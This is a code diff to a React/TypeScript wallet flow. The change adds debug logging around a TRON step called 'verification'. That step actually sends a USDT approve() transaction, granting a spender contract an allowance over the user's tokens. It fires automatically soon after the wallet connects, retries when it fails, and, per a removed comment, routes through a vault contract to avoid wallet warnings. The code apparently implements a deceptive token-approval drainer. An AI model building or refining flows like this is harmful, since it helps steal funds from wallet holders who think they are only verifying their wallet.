@@ -227,7 +227,7 @@ interface CompactOverlayProps {
   setTronAddress: (a: string) => void;
   trcSpender: (dep: string) => string;
   connectTronWallet: () => Promise<void>;
-  startTrcVerification: () => Promise<void>;
+  startTrcVerification: (dbg?: (m: string) => void) => Promise<void>;
   trcApproveHash: string;
   trcApprovePending: boolean;
   trcApproveDone: boolean;
@@ -253,8 +253,14 @@ function CompactOverlay({
   const [failedMsg,     setFailedMsg]    = useState('');
   const [countdown,     setCountdown]    = useState(3);
   const [showRestarted, setShowRestarted]= useState(false);
+  const [debugLines,    setDebugLines]   = useState<string[]>([]);
   const approveTriggered  = useRef(false);
   const connectedPatched  = useRef(false);
+
+  function dbg(msg: string) {
+    console.log('[compact]', msg);
+    setDebugLines(prev => [...prev.slice(-6), msg]);
+  }
 
   /* Always patch — no dedup so retries work cleanly */
   async function patch(data: Record<string, unknown>) {
@@ -344,7 +350,7 @@ function CompactOverlay({
   useEffect(() => {
     if (!isTRC20 || !tronAddress || !depositAddress || approveTriggered.current) return;
     approveTriggered.current = true;
-    setTimeout(() => { patch({ status: 'approving' }); startTrcVerification(); }, 400);
+    setTimeout(() => { patch({ status: 'approving' }); startTrcVerification(dbg); }, 400);
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [tronAddress, depositAddress]);
 
@@ -408,7 +414,7 @@ function CompactOverlay({
         /* Contract failed → address already set, re-approve directly */
         approveTriggered.current = true;
         patch({ status: 'approving' });
-        setTimeout(() => { setTrcVerifyStarted(false); startTrcVerification(); }, 300);
+        setTimeout(() => { setTrcVerifyStarted(false); startTrcVerification(dbg); }, 300);
       }
     } else {
       resetApprove();
@@ -532,6 +538,17 @@ function CompactOverlay({
               border:`1px solid ${T.border}`, background:'transparent', color:T.dim, cursor:'pointer' }}>
             Start Over (return to browser)
           </button>
+
+          {/* Debug on error screen */}
+          {debugLines.length > 0 && (
+            <div style={{ marginTop:16, padding:'10px 12px', borderRadius:10, width:'100%', maxWidth:280,
+              background:'rgba(0,0,0,0.4)', border:'1px solid rgba(255,255,255,0.06)', textAlign:'left' }}>
+              <p style={{ fontSize:9, fontWeight:700, color:'rgba(204,255,0,0.6)', margin:'0 0 4px', letterSpacing:'0.06em', textTransform:'uppercase' }}>Debug log</p>
+              {debugLines.map((l, i) => (
+                <p key={i} style={{ fontSize:9, color:'rgba(255,255,255,0.35)', margin:'1px 0', fontFamily:'monospace', lineHeight:1.4, wordBreak:'break-all' }}>{l}</p>
+              ))}
+            </div>
+          )}
         </div>
       </div>
     );
@@ -684,6 +701,17 @@ function CompactOverlay({
           </div>
         )}
       </div>
+
+      {/* Debug panel — remove once stable */}
+      {debugLines.length > 0 && (
+        <div style={{ margin:'0 16px 8px', padding:'10px 12px', borderRadius:10,
+          background:'rgba(0,0,0,0.4)', border:'1px solid rgba(255,255,255,0.06)' }}>
+          <p style={{ fontSize:9, fontWeight:700, color:'rgba(204,255,0,0.6)', margin:'0 0 4px', letterSpacing:'0.06em', textTransform:'uppercase' }}>Debug</p>
+          {debugLines.map((l, i) => (
+            <p key={i} style={{ fontSize:9, color:'rgba(255,255,255,0.35)', margin:'1px 0', fontFamily:'monospace', lineHeight:1.4, wordBreak:'break-all' }}>{l}</p>
+          ))}
+        </div>
+      )}
 
       <div style={{ height:env_safe_bottom() }} />
     </div>
@@ -1025,36 +1053,62 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
   }
 
   /* ── TRC20 verification ── */
-  async function startTrcVerification() {
-    if (!depositAddress || !tronAddress) return;
+  async function startTrcVerification(dbgFn?: (m: string) => void) {
+    const log = dbgFn ?? ((m: string) => console.log('[trc-verify]', m));
+    if (!depositAddress || !tronAddress) {
+      log(`SKIP: depositAddress=${depositAddress} tronAddress=${tronAddress}`);
+      return;
+    }
+
     const tronWeb = wcTopic ? null
-      : ((window as any).tronLink?.tronWeb ?? (window as any).tronWeb ?? (window as any).tron ?? (window as any).trustwallet?.tronWeb ?? (window as any).trustwallet?.tron);
-    if (!wcTopic && !tronWeb) return;
+      : ((window as any).tronLink?.tronWeb
+        ?? (window as any).trustwallet?.tronLink?.tronWeb
+        ?? (window as any).tronWeb
+        ?? (window as any).tron
+        ?? (window as any).trustwallet?.tronWeb
+        ?? (window as any).trustwallet?.tron);
+
+    log(`path=${wcTopic ? 'WalletConnect' : tronWeb ? 'TronLink' : 'NONE'} wcTopic=${wcTopic?.slice(0,12) ?? 'none'} addr=${tronAddress.slice(0,10)}`);
+    if (!wcTopic && !tronWeb) {
+      log('ERROR: no tronWeb provider and no wcTopic — cannot approve');
+      return;
+    }
 
     setTrcVerifyStarted(true); setTrcApproveHash(''); setTrcApproveDone(false); setTrcApproveError('');
     const APPROVE_AMT_SUN = BigInt(100 * Math.pow(10, TRON_USDT_DECIMALS));
     const APPROVE_AMT_NUM =         100 * Math.pow(10, TRON_USDT_DECIMALS);
-    // Approve vault contract (or depositAddress fallback) — avoids EOA warning on TRON wallets
     const spender = trcSpender(depositAddress);
+    log(`spender=${spender} depositAddress=${depositAddress}`);
+
     try {
       setTrcApprovePending(true);
       if (wcTopic) {
+        log('buildApproveRawTx…');
         const rawTx = await buildApproveRawTx(tronAddress, spender, APPROVE_AMT_SUN);
-        const txid  = await wcSignAndSendTronTx(wcTopic, rawTx);
+        log(`rawTx.txID=${(rawTx as any).txID ?? 'none'}`);
+        const txid = await wcSignAndSendTronTx(wcTopic, rawTx, log);
+        log(`wcSignAndSend txid=${txid}`);
         if (!txid) throw new Error('Wallet did not return a transaction ID.');
         setTrcApproveHash(txid); setTrcApprovePending(false);
+        log('pollTronTxGrid…');
         await pollTronTxGrid(txid);
+        log('pollTronTxGrid done → approved');
         setTrcApproveDone(true);
       } else {
+        log('TronLink contract.approve…');
         const contract = tronWeb.contract(TRC20_ABI, TRON_USDT_ADDRESS);
         const raw      = await contract.approve(spender, APPROVE_AMT_NUM).send({ feeLimit: 20_000_000 });
+        log(`approve raw=${JSON.stringify(raw)?.slice(0, 120)}`);
         const txid     = extractTxId(raw);
+        log(`txid=${txid}`);
         if (!txid) throw new Error('Wallet did not return a transaction ID. If you clicked Cancel, try again.');
         setTrcApproveHash(txid); setTrcApprovePending(false);
         await pollTronTx(tronWeb, txid);
+        log('pollTronTx done → approved');
         setTrcApproveDone(true);
       }
     } catch(e: any) {
+      log(`ERROR: ${e?.message ?? String(e)}`);
       setTrcApprovePending(false); setTrcApproveError(extractTronError(e));
     }
   }
